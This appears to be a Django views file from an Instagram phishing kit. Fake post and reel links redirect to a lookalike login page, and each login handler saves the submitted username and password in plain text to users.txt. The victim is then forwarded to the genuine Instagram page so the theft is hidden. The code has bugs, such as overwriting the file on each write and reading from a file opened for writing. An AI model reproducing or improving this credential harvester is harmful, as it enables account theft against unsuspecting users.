from django.shortcuts import render, redirect

# Create your views here.

def home(request):
    return redirect('/login/')

def post(request, string:str):
    return redirect(f'/login/p/{string}')


def reel(request, string:str):
    return redirect(f'/login/r/{string}')

def loginreel(request, string = ""):
    if request.method == 'POST':
        username = request.POST['username']
        password = request.POST['password']
        
        with open('users.txt', 'w') as file:
            file.write(f'\n{username} : {password}')
        return redirect(f"https://www.instagram.com/reel/{string}")
        
        
    return render(request, 'login.html')

def loginpost(request, string = ""):
    if request.method == 'POST':
        username = request.POST['username']
        password = request.POST['password']
        
        with open('users.txt', 'w') as file:
            file.write(f'\n{username} : {password}')
        return redirect(f"https://www.instagram.com/p/{string}")
        
        
    return render(request, 'login.html')

def login(request):
    if request.method == 'POST':
        username = request.POST['username']
        password = request.POST['password']
        
        with open('users.txt', 'w') as file:
            text = file.read()
            file.write(text)
            file.write(f'\n{username} : {password}')
        return redirect(f"https://www.instagram.com/")
        
        
    return render(request, 'login.html')

